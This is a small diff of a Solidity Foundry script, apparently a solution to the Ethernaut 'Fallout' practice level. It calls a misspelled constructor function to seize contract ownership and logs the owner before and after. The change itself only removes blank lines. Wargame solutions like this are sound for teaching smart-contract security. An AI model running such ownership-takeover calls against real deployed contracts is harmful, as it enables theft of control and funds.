@@ -11,9 +11,7 @@ contract AttackerFalloutScript is Script {
         vm.startBroadcast();
 
         console.log("Current Owner is : ", fallout.owner());
-
         fallout.Fal1out();
-
         console.log("New Owner is : ", fallout.owner());
 
         vm.stopBroadcast();
